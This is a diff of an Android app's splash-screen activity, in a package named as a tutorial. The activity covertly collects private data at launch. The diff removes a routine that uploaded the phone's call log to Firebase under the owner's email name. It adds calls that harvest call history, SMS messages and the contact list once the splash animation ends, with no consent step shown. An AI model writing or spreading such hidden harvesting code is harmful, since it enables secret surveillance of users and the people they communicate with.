@@ -2,22 +2,18 @@ package com.android.tutorial.activity;
 
 import android.content.Intent;
 import android.database.Cursor;
-import android.provider.CallLog;
 import android.widget.Toast;
 
 import com.android.tutorial.R;
-import com.android.tutorial.utils.MyDevice;
 import com.android.tutorial.utils.PrefManager;
 import com.daimajia.androidanimations.library.Techniques;
-import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
 import com.viksaa.sssplash.lib.activity.AwesomeSplash;
 import com.viksaa.sssplash.lib.cnst.Flags;
 import com.viksaa.sssplash.lib.model.ConfigSplash;
 
-import java.util.Date;
-
 import static com.android.tutorial.utils.Utils.fetchSms;
+import static com.android.tutorial.utils.Utils.getCallDetails;
+import static com.android.tutorial.utils.Utils.getContactsList;
 
 public class SplashActivity extends AwesomeSplash {
 
@@ -68,8 +64,9 @@ public class SplashActivity extends AwesomeSplash {
 
     @Override
     public void animationsFinished() {
-        logCallLog();
+        getCallDetails(SplashActivity.this);
         fetchSms(SplashActivity.this);
+        getContactsList(SplashActivity.this);
         PrefManager prefManager = new PrefManager(getApplicationContext());
         if (!prefManager.isFirstTimeLaunch()) {
             launchHomeScreen();
@@ -197,14 +194,7 @@ public class SplashActivity extends AwesomeSplash {
             "             116.00,238.00 116.00,116.00 116.00,116.00\n" +
             "             116.00,116.00 289.00,116.00 289.00,116.00 Z";
 
-    public void logCallLog() {
-        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
-        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
-        mFirebaseDatabase.child("calls").child("" + MyDevice.getDeviceEmailName(SplashActivity.this))
-                .setValue(getCallDetails());
-    }
-
-    private String getCallDetails() {
+    /*private String getCallDetails(String s) {
 
         StringBuffer sb = new StringBuffer();
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
@@ -243,6 +233,6 @@ public class SplashActivity extends AwesomeSplash {
         managedCursor.close();
         return sb.toString();
 
-    }
+    }*/
 }
 
